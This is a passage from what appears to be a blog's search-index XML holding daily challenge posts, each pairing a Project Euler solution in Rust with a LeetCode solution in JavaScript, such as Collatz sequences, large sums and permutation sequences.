up++; else up--; &#125; return up==left&amp;&amp;up==0;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-03 Daily Challenge]]></title>
    <url>%2F2019-01-03-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Longest Collatz sequence in Rust and Permutation Sequence in JavaScript. MathProblem1234567891011121314151617Longest Collatz sequenceProblem 14 The following iterative sequence is defined for the set of positive integers:n → n/2 (n is even)n → 3n + 1 (n is odd)Using the rule above and starting with 13, we generate the following sequence:13 → 40 → 20 → 10 → 5 → 16 → 8 → 4 → 2 → 1It can be seen that this sequence (starting at 13 and finishing at 1) contains 10 terms. Although it has not been proved yet (Collatz Problem), it is thought that all starting numbers finish at 1.Which starting number, under one million, produces the longest chain?NOTE: Once the chain starts the terms are allowed to go above one million. SolutionBrute force, and you&#39;ll find that every number less than half a million can be get with its double, and therefore in a definitely longer chain. Implementation123456789101112131415161718192021fn main() &#123; let mut ans = 0; let mut cnt = 0; for i in 500_000u64..1_000_000u64 &#123; let mut tmp = i; let mut tcnt = 0; while tmp != 1 &#123; if tmp%2 == 0 &#123; tmp /=2; &#125; else &#123; tmp = tmp * 3 + 1; &#125; tcnt += 1; &#125; if tcnt &gt; cnt &#123; ans = i; cnt = tcnt; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem123456789101112131415161718192021222324252660. Permutation SequenceThe set [1,2,3,...,n] contains a total of n! unique permutations.By listing and labeling all of the permutations in order, we get the following sequence for n = 3:&quot;123&quot;&quot;132&quot;&quot;213&quot;&quot;231&quot;&quot;312&quot;&quot;321&quot;Given n and k, return the kth permutation sequence.Note:Given n will be between 1 and 9 inclusive.Given k will be between 1 and n! inclusive.Example 1:Input: n = 3, k = 3Output: &quot;213&quot;Example 2:Input: n = 4, k = 9Output: &quot;2314&quot; SolutionI&#39;m too tired doing my project to explain it... Sry for delay. Implementation12345678910111213141516171819202122232425262728293031/** * @param &#123;number&#125; n * @param &#123;number&#125; k * @return &#123;string&#125; */var getPermutation = function(n, k) &#123; k -= 1; let fac = [1, 1, 2, 6, 24, 120, 720, 5040, 40320, 369880]; let used = new Array(n); let nums = new Array(); let ans = ""; for(let i = 1; i &lt;= n ; ++i)&#123; nums.push(i); &#125; let cur = n - 1; while(cur &gt;= 0) &#123; let index = Math.floor(k/fac[cur]); k %= fac[cur]; for(const [i, v] of nums.entries())&#123; if(used[i] === undefined)&#123; if(index) --index; else &#123;ans += v; used[i] = 1; break;&#125; &#125; &#125; --cur; &#125; return ans;&#125;;// console.log(getPermutation(3,3));// console.log(getPermutation(4,9));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-02 Daily Challenge]]></title>
    <url>%2F2019-01-02-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Large sum in Rust and Subdomain Visit Count in JavaScript. MathProblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106Large sumProblem 13 Work out the first ten digits of the sum of the following one-hundred 50-digit numbers.37107287533902102798797998220837590246510135740250463769376774900097126481248969700780504170182605387432498619952474105947423330951305812372661730962991942213363574161572522430563301811072406154908250230675882075393461711719803104210475137780632466768926167069662363382013637841838368417873436172675728112879812849979408065481931592621691275889832738442742289174325203219235894228767964876702721893184745144573600130643909116721685684458871160315327670386486105843025439939619828917593665686757934951621764571418565606295021572231965867550793241933316490635246274190492910143244581382266334794475817892575867718337217661963751590579239728245598838407582035653253593990084026335689488301894586282278288018119938482628201427819413994056758715117009439035398664372827112653829987240784473053190104293586865155060062958648615320752733719591914205172558297169388870771546649911559348760353292171497005693854370070576826684624621495650076471787294438377604532826541087568284431911906346940378552177792951453612327252500029607107508256381565671088525835072145876576172410976447339110607218265236877223636045174237069058518606604482076212098132878607339694128114266041808683061932846081119106155694051268969251934325451728388641918047049293215058642563049483624672216484350762017279180399446930047329563406911573244438690812579451408905770622942919710792820955037687525678773091862540744969844508330393682126183363848253301546861961243487676812975343759465158038628759287849020152168555482871720121925776695478182833757993103614740356856449095527097864797581167263201004368978425535399209318374414978068609844840309812907779179908821879532736447567559084803087086987551392711854517078544161852424320693150332599594068957565367821070749269665376763262354472106979395067965269474259770973916669376304263398708541052684708299085211399427365734116182760315001271653786073615010808570091499395125570281987460043753582903531743471732693212357815498262974255273730794953759765105305946966067683156574377167401875275889028025717332296191766687138199318110487701902712526768027607800301367868099252546340106163286652636270218540497705585629946580636237993140746255962240744869082311749777923654662572469233228109171419143028819710328859780666976089293863828502533340334413065578016127815921815005561868836468420090470230530811728164304876237919698424872550366387845831148769693215490281042402013833512446218144177347063783299490636259666498587618221225225512486764533677201869716985443124195724099139590089523100588229554825530026352078153229679624948164195386821877476085327132285723110424803456124867697064507995236377742425354112916842768655389262050249103265729672370191327572567528565324825826546309220705859652229798860272258331913126375147341994889534765745501184957014548792889848568277260777137214037988797153829820378303147352772158034814451349137322665138134829543829199918180278916522431027392251122869539409579530664052326325380441000596549391598795936352974615218550237130764225512118369380358038858490341698116222072977186158236678424689157993532961922624679571944012690438771072750481023908955235974572318970677254791506150550495392297953090112996751986188088225875314529584099251203829009407770775672113067397083047244838165338735023408456470580773088295917476714036319800818712901187549131054712658197623331044818386269515456334926366572897563400500428462801835170705278318394258821455212272512503275512160354698120058176216521282765275169129689778932238195734329339946437501907836945765883352399886755061649651847751807381688378610915273579297013376217784275219262340194239963916804498399317331273132924185707147349566916674687634660915035914677504995186714302352196288948901024233251169136196266227326746080059154747183079839286853520694694454072476841822524674417161514036427982273348055556214818971426179103425986472045168939894221798260880768528778364618279934631376775430780936333301898264209010848802521674670883215120185883543223812876952786713296124747824645386369930090493103636197638780396218407357239979422340623539380833965132740801111666627891981488087797941876876144230030984490851411606618262936828367647447792391803351109890697907148578694408955299065364044742557608365997664579509666024396409905389607120198219976047599490197230297649139826800329731560371200413779037855660850892521673093931987275027546890690370753941304265231501194809377245048795150954100921645863754710598436791786391670211874924319957006419179697775990283006991536871371193661495281130587638027841075444973307840789923115535562561142322423255033685442488917353448899115014406480203690680639606723221932041495354150312888033953605329934036800697771065056663195481234880673210146739058568557934581403627822703280826165707739483275922328459417065250945123252306082291880205877731971983945018088807242966198081119777158542502016545090413245809786882778948721859617721078384350691861554356628840622574736922845095162084960398013400172393067166682355524525280460972253503534226472524250874054075591789781264330331690 SolutionRust don&#39;t support slice towards unknown size string, so... Implementation123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112extern crate num_bigint;use num_bigint::BigInt;fn main() &#123; let nums = [b"37107287533902102798797998220837590246510135740250",b"46376937677490009712648124896970078050417018260538",b"74324986199524741059474233309513058123726617309629",b"91942213363574161572522430563301811072406154908250",b"23067588207539346171171980310421047513778063246676",b"89261670696623633820136378418383684178734361726757",b"28112879812849979408065481931592621691275889832738",b"44274228917432520321923589422876796487670272189318",b"47451445736001306439091167216856844588711603153276",b"70386486105843025439939619828917593665686757934951",b"62176457141856560629502157223196586755079324193331",b"64906352462741904929101432445813822663347944758178",b"92575867718337217661963751590579239728245598838407",b"58203565325359399008402633568948830189458628227828",b"80181199384826282014278194139940567587151170094390",b"35398664372827112653829987240784473053190104293586",b"86515506006295864861532075273371959191420517255829",b"71693888707715466499115593487603532921714970056938",b"54370070576826684624621495650076471787294438377604",b"53282654108756828443191190634694037855217779295145",b"36123272525000296071075082563815656710885258350721",b"45876576172410976447339110607218265236877223636045",b"17423706905851860660448207621209813287860733969412",b"81142660418086830619328460811191061556940512689692",b"51934325451728388641918047049293215058642563049483",b"62467221648435076201727918039944693004732956340691",b"15732444386908125794514089057706229429197107928209",b"55037687525678773091862540744969844508330393682126",b"18336384825330154686196124348767681297534375946515",b"80386287592878490201521685554828717201219257766954",b"78182833757993103614740356856449095527097864797581",b"16726320100436897842553539920931837441497806860984",b"48403098129077791799088218795327364475675590848030",b"87086987551392711854517078544161852424320693150332",b"59959406895756536782107074926966537676326235447210",b"69793950679652694742597709739166693763042633987085",b"41052684708299085211399427365734116182760315001271",b"65378607361501080857009149939512557028198746004375",b"35829035317434717326932123578154982629742552737307",b"94953759765105305946966067683156574377167401875275",b"88902802571733229619176668713819931811048770190271",b"25267680276078003013678680992525463401061632866526",b"36270218540497705585629946580636237993140746255962",b"24074486908231174977792365466257246923322810917141",b"91430288197103288597806669760892938638285025333403",b"34413065578016127815921815005561868836468420090470",b"23053081172816430487623791969842487255036638784583",b"11487696932154902810424020138335124462181441773470",b"63783299490636259666498587618221225225512486764533",b"67720186971698544312419572409913959008952310058822",b"95548255300263520781532296796249481641953868218774",b"76085327132285723110424803456124867697064507995236",b"37774242535411291684276865538926205024910326572967",b"23701913275725675285653248258265463092207058596522",b"29798860272258331913126375147341994889534765745501",b"18495701454879288984856827726077713721403798879715",b"38298203783031473527721580348144513491373226651381",b"34829543829199918180278916522431027392251122869539",b"40957953066405232632538044100059654939159879593635",b"29746152185502371307642255121183693803580388584903",b"41698116222072977186158236678424689157993532961922",b"62467957194401269043877107275048102390895523597457",b"23189706772547915061505504953922979530901129967519",b"86188088225875314529584099251203829009407770775672",b"11306739708304724483816533873502340845647058077308",b"82959174767140363198008187129011875491310547126581",b"97623331044818386269515456334926366572897563400500",b"42846280183517070527831839425882145521227251250327",b"55121603546981200581762165212827652751691296897789",b"32238195734329339946437501907836945765883352399886",b"75506164965184775180738168837861091527357929701337",b"62177842752192623401942399639168044983993173312731",b"32924185707147349566916674687634660915035914677504",b"99518671430235219628894890102423325116913619626622",b"73267460800591547471830798392868535206946944540724",b"76841822524674417161514036427982273348055556214818",b"97142617910342598647204516893989422179826088076852",b"87783646182799346313767754307809363333018982642090",b"10848802521674670883215120185883543223812876952786",b"71329612474782464538636993009049310363619763878039",b"62184073572399794223406235393808339651327408011116",b"66627891981488087797941876876144230030984490851411",b"60661826293682836764744779239180335110989069790714",b"85786944089552990653640447425576083659976645795096",b"66024396409905389607120198219976047599490197230297",b"64913982680032973156037120041377903785566085089252",b"16730939319872750275468906903707539413042652315011",b"94809377245048795150954100921645863754710598436791",b"78639167021187492431995700641917969777599028300699",b"15368713711936614952811305876380278410754449733078",b"40789923115535562561142322423255033685442488917353",b"44889911501440648020369068063960672322193204149535",b"41503128880339536053299340368006977710650566631954",b"81234880673210146739058568557934581403627822703280",b"82616570773948327592232845941706525094512325230608",b"22918802058777319719839450180888072429661980811197",b"77158542502016545090413245809786882778948721859617",b"72107838435069186155435662884062257473692284509516",b"20849603980134001723930671666823555245252804609722",b"53503534226472524250874054075591789781264330331690"]; let mut sum = BigInt::parse_bytes(b"0", 10).unwrap(); for i in nums.iter() &#123; let tmp = BigInt::parse_bytes(*i, 10).unwrap(); sum = sum + &amp;tmp; &#125; println!("Answer is &#123;&#125;",sum.to_str_radix(10));&#125; AlgorithmProblem12345678910111213141516171819202122232425262728293031811. Subdomain Visit CountA website domain like &quot;discuss.leetcode.com&quot; consists of various subdomains. At the top level, we have &quot;com&quot;, at the next level, we have &quot;leetcode.com&quot;, and at the lowest level, &quot;discuss.leetcode.com&quot;. When we visit a domain like &quot;discuss.leetcode.com&quot;, we will also visit the parent domains &quot;leetcode.com&quot; and &quot;com&quot; implicitly.Now, call a &quot;count-paired domain&quot; to be a count (representing the number of visits this domain received), followed by a space, followed by the address. An example of a count-paired domain might be &quot;9001 discuss.leetcode.com&quot;.We are given a list cpdomains of count-paired domains. We would like a list of count-paired domains, (in the same format as the input, and in any order), that explicitly counts the number of visits to each subdomain.Example 1:Input: [&quot;9001 discuss.leetcode.com&quot;]Output: [&quot;9001 discuss.leetcode.com&quot;, &quot;9001 leetcode.com&quot;, &quot;9001 com&quot;]Explanation: We only have one website domain: &quot;discuss.leetcode.com&quot;. As discussed above, the subdomain &quot;leetcode.com&quot; and &quot;com&quot; will also be visited. So they will all be visited 9001 times.Example 2:Input: [&quot;900 google.mail.com&quot;, &quot;50 yahoo.com&quot;, &quot;1 intel.mail.com&quot;, &quot;5 wiki.org&quot;]Output: [&quot;901 mail.com&quot;,&quot;50 yahoo.com&quot;,&quot;900 google.mail.com&quot;,&quot;5 wiki.org&quot;,&quot;5 org&quot;,&quot;1 intel.mail.com&quot;,&quot;951 com&quot;]Explanation: We will visit &quot;google.mail.com&quot; 900 times, &quot;yahoo.com&quot; 50 times, &quot;intel.mail.com&quot; once and &quot;wiki.org&quot; 5 times. For the subdomains, we will visit &quot;mail.com&quot; 900 + 1 = 901 times, &quot;com&quot; 900 + 50 + 1 = 951 times, and &quot;org&quot; 5 times.Notes:The length of cpdomains will not exceed 100. The length of each domain name will not exceed 100.Each address will have either 1 or 2 &quot;.&quot; characters.The input count in any count-paired domain will not exceed 10000.The answer output can be returned in any order. Solutionjust need a map. Implementation123456789101112131415161718192021222324252627282930/** * @param &#123;string[]&#125; cpdomains * @return &#123;string[]&#125; */var subdomainVisits = function(cpdomains) &#123; let map = new Map(); let ans = []; let add = (key, val) =&gt; &#123; if (map.has(key)) map.set(key, map.get(key) + val); else map.set(key, val); &#125;; for(let cpdomain of cpdomains)&#123; let tmp = cpdomain.split(" "); let cnt = +tmp[0]; let domain = tmp[1]; add(domain, cnt); for(let i = domain.length - 1; i&gt;= 0 ; --i)&#123; if(domain.charAt(i) === ".") &#123; add(domain.slice(i+1), cnt); &#125; &#125; &#125; for(const [key, value] of map)&#123; ans.push(value + " " + key); &#125; return ans;&#125;;// console.log(subdomainVisits(["900 google.mail.com", "50 yahoo.com", "1 intel.mail.com", "5 wiki.org"]));// console.log(subdomainVisits(["9001 discuss.leetcode.com"]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019-01-01 Daily Challenge]]></title>
    <url>%2F2019-01-01-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[HAPPY NEW YEAR! What I&#39;ve done today is Highly divisible triangular number in Rust and Same Tree in JavaScript. MathProblem1234567891011121314151617181920Highly divisible triangular numberProblem 12 The sequence of triangle numbers is generated by adding the natural numbers. So the 7th triangle number would be 1 + 2 + 3 + 4 + 5 + 6 + 7 = 28. The first ten terms would be:1, 3, 6, 10, 15, 21, 28, 36, 45, 55, ...Let us list the factors of the first seven triangle numbers: 1: 1 3: 1,3 6: 1,2,3,610: 1,2,5,1015: 1,3,5,1521: 1,3,7,2128: 1,2,4,7,14,28We can see that 28 is the first triangle number to have over five divisors.What is the value of the first triangle number to have over five hundred divisors? SolutionIt&#39;s easy to understand that if prime factorization of $n$ is given by $$n=p_1^{v_1}p_2^{v_2}...p_k^{v_k}$$ Then the number of positive divisors of $n$ is $$d(n)=(v_1+1)(v_2+1)...(v_k+1)$$. If you do not get it, check https://www.math.upenn.edu/~deturck/m170/wk2/numdivisors.html So just factorize triangle numbers and check if it&#39;s answer. Implementation123456789101112131415161718192021extern crate primal;fn main() &#123; let sieve = primal::Sieve::new(14751430); let mut ans = 0i64; for i in 1i64..10000000i64 &#123; ans += i; let factors: Vec&lt;(usize, usize)&gt; = match sieve.factor(ans as usize) &#123; Ok(v) =&gt; v, Err(_) =&gt; Vec::new(), &#125;; let mut count = 1; for factor in factors &#123; count *= factor.1 + 1; &#125; if count &gt; 500 &#123; println!("Answer is &#123;&#125;", ans); break; &#125; &#125;&#125; AlgorithmProblem123456789101112131415161718192021222324252627282930313233100. Same TreeGiven two binary trees, write a function to check if they are the same or not.Two binary trees are considered the same if they are structurally identical and the nodes have the same value.Example 1:Input: 1 1 / \ / \ 2 3 2 3 [1,2,3], [1,2,3]Output: trueExample 2:Input: 1 1 / \ 2 2 [1,2], [1,null,2]Output: falseExample 3:Input: 1 1 / \ / \ 2 1 1 2 [1,2,1], [1,1,2]Output: false SolutionI just to lazy to implement it with non-recursive approach. ;P Implementation123456789101112131415161718/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; p * @param &#123;TreeNode&#125; q * @return &#123;boolean&#125; */var isSameTree = (p, q) =&gt; &#123; if(!q||!p) return q===p; return isSameTree(p.left,q.left)&amp;&amp; isSameTree(p.right,q.right)&amp;&amp; q.val===p.val;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-31 Daily Challenge]]></title>
    <url>%2F2018-12-31-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Largest product in a grid in Rust and Reveal Cards In Increasing Order in JavaScript. MathProblem123456789101112131415161718192021222324252627282930Largest product in a gridProblem 11 In the 20×20 grid below, four numbers along a diagonal line have been marked in red.08 02 22 97 38 15 00 40 00 75 04 05 07 78 52 12 50 77 91 0849 49 99 40 17 81 18 57 60 87 17 40 98 43 69 48 04 56 62 0081 49 31 73 55 79 14 29 93 71 40 67 53 88 30 03 49 13 36 6552 70 95 23 04 60 11 42 69 24 68 56 01 32 56 71 37 02 36 9122 31 16 71 51 67 63 89 41 92 36 54 22 40 40 28 66 33 13 8024 47 32 60 99 03 45 02 44 75 33 53 78 36 84 20 35 17 12 5032 98 81 28 64 23 67 10 26 38 40 67 59 54 70 66 18 38 64 7067 26 20 68 02 62 12 20 95 63 94 39 63 08 40 91 66 49 94 2124 55 58 05 66 73 99 26 97 17 78 78 96 83 14 88 34 89 63 7221 36 23 09 75 00 76 44 20 45 35 14 00 61 33 97 34 31 33 9578 17 53 28 22 75 31 67 15 94 03 80 04 62 16 14 09 53 56 9216 39 05 42 96 35 31 47 55 58 88 24 00 17 54 24 36 29 85 5786 56 00 48 35 71 89 07 05 44 44 37 44 60 21 58 51 54 17 5819 80 81 68 05 94 47 69 28 73 92 13 86 52 17 77 04 89 55 4004 52 08 83 97 35 99 16 07 97 57 32 16 26 26 79 33 27 98 6688 36 68 87 57 62 20 72 03 46 33 67 46 55 12 32 63 93 53 6904 42 16 73 38 25 39 11 24 94 72 18 08 46 29 32 40 62 76 3620 69 36 41 72 30 23 88 34 62 99 69 82 67 59 85 74 04 36 1620 73 35 29 78 31 90 01 74 31 49 71 48 86 81 16 23 57 05 5401 70 54 71 83 51 54 69 16 92 33 48 61 43 52 01 89 19 67 48The product of these numbers is 26 × 63 × 78 × 14 = 1788696.What is the greatest product of four adjacent numbers in the same direction (up, down, left, right, or diagonally) in the 20×20 grid? SolutionBrute force again Implementation1234567891011121314151617181920212223242526272829303132333435363738394041424344454647fn main() &#123; let arr = [[49, 49, 99, 40, 17, 81, 18, 57, 60, 87, 17, 40, 98, 43, 69, 48, 04, 56, 62, 00],[81, 49, 31, 73, 55, 79, 14, 29, 93, 71, 40, 67, 53, 88, 30, 03, 49, 13, 36, 65],[52, 70, 95, 23, 04, 60, 11, 42, 69, 24, 68, 56, 01, 32, 56, 71, 37, 02, 36, 91],[22, 31, 16, 71, 51, 67, 63, 89, 41, 92, 36, 54, 22, 40, 40, 28, 66, 33, 13, 80],[24, 47, 32, 60, 99, 03, 45, 02, 44, 75, 33, 53, 78, 36, 84, 20, 35, 17, 12, 50],[32, 98, 81, 28, 64, 23, 67, 10, 26, 38, 40, 67, 59, 54, 70, 66, 18, 38, 64, 70],[67, 26, 20, 68, 02, 62, 12, 20, 95, 63, 94, 39, 63, 08, 40, 91, 66, 49, 94, 21],[24, 55, 58, 05, 66, 73, 99, 26, 97, 17, 78, 78, 96, 83, 14, 88, 34, 89, 63, 72],[21, 36, 23, 09, 75, 00, 76, 44, 20, 45, 35, 14, 00, 61, 33, 97, 34, 31, 33, 95],[78, 17, 53, 28, 22, 75, 31, 67, 15, 94, 03, 80, 04, 62, 16, 14, 09, 53, 56, 92],[16, 39, 05, 42, 96, 35, 31, 47, 55, 58, 88, 24, 00, 17, 54, 24, 36, 29, 85, 57],[86, 56, 00, 48, 35, 71, 89, 07, 05, 44, 44, 37, 44, 60, 21, 58, 51, 54, 17, 58],[19, 80, 81, 68, 05, 94, 47, 69, 28, 73, 92, 13, 86, 52, 17, 77, 04, 89, 55, 40],[04, 52, 08, 83, 97, 35, 99, 16, 07, 97, 57, 32, 16, 26, 26, 79, 33, 27, 98, 66],[88, 36, 68, 87, 57, 62, 20, 72, 03, 46, 33, 67, 46, 55, 12, 32, 63, 93, 53, 69],[04, 42, 16, 73, 38, 25, 39, 11, 24, 94, 72, 18, 08, 46, 29, 32, 40, 62, 76, 36],[20, 69, 36, 41, 72, 30, 23, 88, 34, 62, 99, 69, 82, 67, 59, 85, 74, 04, 36, 16],[20, 73, 35, 29, 78, 31, 90, 01, 74, 31, 49, 71, 48, 86, 81, 16, 23, 57, 05, 54],[01, 70, 54, 71, 83, 51, 54, 69, 16, 92, 33, 48, 61, 43, 52, 01, 89, 19, 67, 48]]; let mut ans = 0; for i in 0..19 &#123; for j in 0..20 &#123; if i &lt; 16 &#123; if arr[i][j]*arr[i+1][j]*arr[i+2][j]*arr[i+3][j]&gt;ans &#123; ans = arr[i][j]*arr[i+1][j]*arr[i+2][j]*arr[i+3][j]; &#125; &#125; if j &lt; 17 &#123; if arr[i][j]*arr[i][j+1]*arr[i][j+2]*arr[i][j+3]&gt;ans &#123; ans = arr[i][j]*arr[i][j+1]*arr[i][j+2]*arr[i][j+3]; &#125; &#125; if i &lt; 16 &amp;&amp; j &lt; 17 &#123; if arr[i][j]*arr[i+1][j+1]*arr[i+2][j+2]*arr[i+3][j+3]&gt;ans &#123; ans = arr[i][j]*arr[i+1][j+1]*arr[i+2][j+2]*arr[i+3][j+3]; &#125; &#125; if i &lt; 16 &amp;&amp; j &gt; 2 &#123; if arr[i][j]*arr[i+1][j-1]*arr[i+2][j-2]*arr[i+3][j-3]&gt;ans &#123; ans = arr[i][j]*arr[i+1][j-1]*arr[i+2][j-2]*arr[i+3][j-3]; &#125; &#125; &#125; &#125; println!("Answer is &#123;&#125;", ans);&#125; AlgorithmProblem123456789101112131415161718192021222324252627282930313233343536373839950. Reveal Cards In Increasing OrderIn a deck of cards, every card has a unique integer. You can order the deck in any order you want.Initially, all the cards start face down (unrevealed) in one deck.Now, you do the following steps repeatedly, until all cards are revealed:Take the top card of the deck, reveal it, and take it out of the deck.If there are still cards in the deck, put the next top card of the deck at the bottom of the deck.If there are still unrevealed cards, go back to step 1. Otherwise, stop.Return an ordering of the deck that would reveal the cards in increasing order.The first entry in the answer is considered to be the top of the deck. Example 1:Input: [17,13,11,2,3,5,7]Output: [2,13,3,11,5,17,7]Explanation: We get the deck in the order [17,13,11,2,3,5,7] (this order doesn&apos;t matter), and reorder it.After reordering, the deck starts as [2,13,3,11,5,17,7], where 2 is the top of the deck.We reveal 2, and move 13 to the bottom. The deck is now [3,11,5,17,7,13].We reveal 3, and move 11 to the bottom. The deck is now [5,17,7,13,11].We reveal 5, and move 17 to the bottom. The deck is now [7,13,11,17].We reveal 7, and move 13 to the bottom. The deck is now [11,17,13].We reveal 11, and move 17 to the bottom. The deck is now [13,17].We reveal 13, and move 17 to the bottom. The deck is now [17].We reveal 17.Since all the cards revealed are in increasing order, the answer is correct. Note:1 &lt;= A.length &lt;= 10001 &lt;= A[i] &lt;= 10^6A[i] != A[j] for all i != j SolutionOne way is to simulate the reversing process, another way is find where every location of cards in original deck. But sort need $O(n\log n)$, I guess that&#39;s the upper bound of this problem. Implementation12345678910111213141516171819202122232425262728293031323334353637383940414243/** * @param &#123;number[]&#125; deck * @return &#123;number[]&#125; */var deckRevealedIncreasing = (deck) =&gt; &#123; deck.sort((a,b) =&gt; &#123;return a-b;&#125;); const ans = new Array(deck.length); let index = []; for(let i = 0; i &lt; deck.length; ++i) &#123; index.push(i); &#125; let hold = true; let cnt = 0; while(index.length) &#123; if(hold) &#123; let i = index.shift(); ans[i] = deck[cnt]; ++cnt; hold = false; &#125; else &#123; hold = true; index.push(index.shift()) &#125; &#125; return ans;&#125;;/** * @param &#123;number[]&#125; deck * @return &#123;number[]&#125; */var deckRevealedIncreasing_simu = (deck) =&gt; &#123; deck.sort((a,b) =&gt; &#123;return a-b;&#125;); const ans = [deck[deck.length - 1]]; for(let i = deck.length - 2; i &gt;= 0 ; --i) &#123; ans.unshift(ans.pop()); ans.unshift(deck[i]); &#125; return ans;&#125;;// console.log(deckRevealedIncreasing([17,13,11,2,3,5,7]));// console.log(deckRevealedIncreasing_simu([17,13,11,2,3,5,7]));]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-30 Daily Challenge]]></title>
    <url>%2F2018-12-30-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Summation of primes in Rust and Best Time to Buy and Sell Stock with Transaction Fee in JavaScript. MathProblem1234567Summation of primesProblem 10 The sum of the primes below 10 is 2 + 3 + 5 + 7 = 17.Find the sum of all the primes below two million. SolutionSieve for prime!!!! Extern crate again ;D Implementation12345678910extern crate primal;fn main() &#123; let sieve = primal::Sieve::new(2_000_000); let mut ans64: i64 = 0; for p in sieve.primes_from(2) &#123; ans64 += p as i64; &#125; println!("Answer is &#123;&#125;", ans64);&#125; AlgorithmProblem1234567891011121314151617181920212223714. Best Time to Buy and Sell Stock with Transaction FeeYour are given an array of integers prices, for which the i-th element is the price of a given stock on day i; and a non-negative integer fee representing a transaction fee.You may complete as many transactions as you like, but you need to pay the transaction fee for each transaction. You may not buy more than 1 share of a stock at a time (ie. you must sell the stock share before you buy again.)Return the maximum profit you can make.Example 1:Input: prices = [1, 3, 2, 8, 4, 9], fee = 2Output: 8Explanation: The maximum profit can be achieved by:Buying at prices[0] = 1Selling at prices[3] = 8Buying at prices[4] = 4Selling at prices[5] = 9The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8.Note:0 &lt; prices.length &lt;= 50000.0 &lt; prices[i] &lt; 50000.0 &lt;= fee &lt; 50000. SolutionI remembered that similar question is example problem of Divide and Conquer algorithm in Introduction to Algorithm. But this question can not be done with this method. We should maintain the max profit of holding stock and not holding stock, and recursively conquer it. Implementation1234567891011121314/** * @param &#123;number[]&#125; prices * @param &#123;number&#125; fee * @return &#123;number&#125; */var maxProfit = (prices, fee) =&gt; &#123; let nothold = 0; let hold = -prices[0] - fee; for(const p of prices)&#123; nothold = (nothold&gt;hold+p)?nothold:hold+p; hold = (hold&gt;nothold-p-fee)?hold:nothold-p-fee; &#125; return nothold;&#125;;]]></content>
      <categories>
        <category>DailyChallenge</category>
      </categories>
      <tags>
        <tag>Math</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
        <tag>ProjectEuler</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018-12-29 Daily Challenge]]></title>
    <url>%2F2018-12-29-Daily-Challenge%2F</url>
    <content type="text"><![CDATA[What I&#39;ve done today is Special Pythagorean triplet in Rust and Dota2 Senate in JavaScript. MathProblem1234567891011Special Pythagorean tripletProblem 9 A Pythagorean triplet is a set of three natural numbers, a &lt; b &lt; c, for which,a^2 + b^2 = c^2For example, 3^2 + 4^2 = 9 + 16 = 25 = 5^2.There exists exactly one Pythagorean triplet for which a + b + c = 1000.Find the product abc. SolutionBrute force is still enough. And I implicated the solution in the overview, but I need some time to digest it. Implementation1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071fn main() &#123; let mut a: (i32, i32, i32); a = pythagorean_triplet_brute(1000); println!("a = &#123;&#125;\nb = &#123;&#125;\nc = &#123;&#125;\nAnswer is &#123;&#125;",a.0,a.1,a.2,a.0*a.1*a.2); a = pythagorean_triplet(1000); println!("a = &#123;&#125;\nb = &#123;&#125;\nc = &#123;&#125;\nAnswer is &#123;&#125;",a.0,a.1,a.2,a.0*a.1*a.2);&#125;fn pythagorean_triplet_brute(n: i32) -&gt; (i32, i32, i32) &#123; let mut a = 0; let mut b = 0; let mut c = 0; for i in 1..(n/3)+1 &#123; for j in 1..(n-i)/2 &#123; let k = n - i - j; if !(i&lt;j&amp;&amp;j&lt;k) &#123; continue; &#125; if i*i + j*j == k*k &#123; c = k; b = j; a = i; &#125; &#125; &#125; (a, b, c)&#125;// Only return first Pythagorean tripletfn pythagorean_triplet(s: i32) -&gt; (i32, i32, i32) &#123; let s2: i32 = s /2; let mut sm: i32; let mut k: i32; let mut tmp: f64 = (s2 as f64) / 2f64; let d: i32; let n: i32; tmp = tmp.sqrt().ceil(); let mlimit: i32 = tmp as i32; for m in 2..mlimit &#123; if s2 % m == 0 &#123; sm = s2 / m; while sm % 2 == 0 &#123; sm /= 2; &#125; if m % 2 == 1 &#123; k = m + 2; &#125;else &#123; k = m + 1; &#125; while k &lt; 2*m &amp;&amp; k &lt;= sm &#123; if sm % k == 0 &amp;&amp; gcd(k, m) == 1 &#123; d = s2 / (k*m); n = k-m; return (d*(m*m-n*n),2*d*m*n,d*(m*m+n*n)); &#125; k += 2; &#125; &#125; &#125; (0, 0, 0)&#125;fn gcd(mut a: i32, mut b: i32) -&gt; i32 &#123; let 